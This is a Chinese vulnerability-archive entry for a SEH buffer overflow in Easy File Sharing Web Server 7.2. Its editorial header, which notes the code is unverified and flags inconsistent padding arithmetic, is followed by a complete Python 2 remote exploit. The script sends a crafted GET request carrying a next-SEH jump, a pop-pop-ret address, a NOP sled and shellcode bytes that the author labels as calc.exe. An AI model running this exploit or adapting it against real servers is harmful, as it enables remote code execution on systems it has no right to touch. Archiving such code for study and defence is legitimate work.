---
source: "白阁文库 BaizeSec/bylibrary"
title: "Easy File Sharing Web Server 7.2 - GET 缓冲区溢出 (SEH)"
product: "Easy File Sharing Web Server 7.2"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "脚本测试XP SP3英文版、特定pop-pop-ret地址/模块布局；其他平台不可推定"
runtime: "历史示例含 Python 2 专用依赖；未进行运行验证"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-6970830c6a602e8c51a72567"
entity_id: "ve-6970830c6a602e8c51a72567"
schema_version: "1"
---

# Easy File Sharing Web Server 7.2 - GET 缓冲区溢出 (SEH)

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：脚本测试XP SP3英文版、特定pop-pop-ret地址/模块布局；其他平台不可推定
- 证据范围：完整读Python2脚本与原始shellcode字节，未执行或反汇编；标题calc行为为作者标注

### 本次正文校订

- 运行时标注：原示例含 Python 2 专用语法或模块，不能直接按 Python 3 运行；不在本次校订中迁移或执行。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 无受影响范围/修复版本/根因与响应证据
- entire=4500未使用，padding公式减20两次却实际加19和7，总长不等宣称4500
- 没有参数校验和Python2依赖说明

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

### Easy File Sharing Web Server 7.2 - GET 缓冲区溢出 (SEH)

### POC

```python

# Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP request SEH Buffer Overflow
# Tested on: XP SP3 EN
# category: Remote Exploit
# Usage: ./exploit.py ip port

import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

a = socket.socket()

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port))

entire=4500

# Junk
buff = "A"*4061

# Next SEH
buff+= "\xeb\x0A\x90\x90"

# pop pop ret
buff+= "\x98\x97\x01\x10"

buff+= "\x90"*19

# calc.exe
# Bad Characters: \x20 \x2f \x5c
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)
buff+= shellcode

buff+= "\x90"*7

buff+= "A"*(4500-4061-4-4-20-len(shellcode)-20)

# GET
a.send("GET " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."
```


---

> 来源：白阁文库 BaizeSec/bylibrary
